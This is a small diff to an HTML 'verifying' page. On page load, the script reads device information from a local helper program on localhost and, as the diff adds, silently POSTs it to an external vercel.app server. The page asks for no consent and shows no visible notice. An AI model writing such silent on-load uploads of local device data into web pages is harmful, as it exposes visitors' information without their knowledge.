@@ -2,15 +2,22 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>裝置驗證中...</title>
+  <title>驗證中...</title>
   <script>
     document.addEventListener("DOMContentLoaded", async function () {
       try {
         const res = await fetch("http://localhost:12345/get_info");
-        const data = await res.json();
-        console.log("裝置資訊已送出:", data);
+        const info = await res.json();
+
+        await fetch("https://web-tsubasa-git-main-tsubasa-k-s-projects.vercel.app/", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(info)
+        });
+
+        console.log("已上傳裝置資訊", info);
       } catch (err) {
-        console.error("無法連線本機偵測程式:", err);
+        console.error("無法讀取本機資訊:", err);
       }
     });
   </script>
